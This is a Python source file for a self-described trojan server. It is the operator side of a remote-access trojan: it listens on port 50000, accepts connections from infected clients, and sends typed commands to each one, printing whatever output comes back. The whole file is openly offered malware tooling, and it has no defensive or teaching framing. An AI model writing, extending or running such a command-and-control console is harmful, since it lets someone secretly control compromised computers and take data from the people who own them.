import socket,threading

class TrojanServer(object):
    def __init__(self):
        self.host = "0.0.0.0"                       # You IP
        self.port = 50000                           # You Port
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind((self.host, self.port))
        print("Server running...")

    def listener(self):
        self.s.listen(10)
        while True:
            client, address = self.s.accept()
            ipstr= address[0] + ":"+ str(address[1])
            client.settimeout(60)
            print("Get connection from "+ ipstr)
            threading.Thread(target=self.client_conn, name=ipstr, args=(client,address)).start()
    
    def client_conn(self,client, address):
        while True:
            ipstr= address[0] + ":" + str(address[1]) + " >> "
            cmd = ""
            while cmd == "":
                cmd = input(ipstr).strip()
            
            if cmd.lower() == "show clients":
                print()
                print("CLIENTS:")
                print("========")
                for t in threading.enumerate():
                    print(t.getName())
            
            elif cmd.lower().startswith("useconn"):
                tmp = cmd.split(" ")
                for t in threading.enumerate():
                    if (t.getName() == tmp[1].strip()):
                        t.join()
            
            ### HELP ###
            elif cmd.lower() == "help" or cmd.lower() == "?":
                print("COMMANDS:")
                print("=========")
                print("show clients         - List all connected clients")
                print("useconn [IP:PORT]    - Switch to the connection")
                print("Bye!                 - closes the connection from the client")
                print("help                 - Show all commands and options")

            ### SEND ###
            else:
                try:
                    b_arr = bytearray()
                    b_arr.extend(map(ord, cmd))
                    client.send(b_arr)

                    ### LISTEN DATA ###  
                    data = client.recv(8192).decode("UTF-8",errors="replace")

                    if data:
                        print(str(data))
                        if str(data) == "Bye!":
                            raise ConnectionError("Client disconnected")
                    
                    else:
                        raise ConnectionError("Client disconnected")

                except ConnectionError:
                    print("Client "+ str(address)+" disconnected")
                    client.close()
                    return False

if __name__== "__main__":
    trojan_server = TrojanServer()
    trojan_server.listener()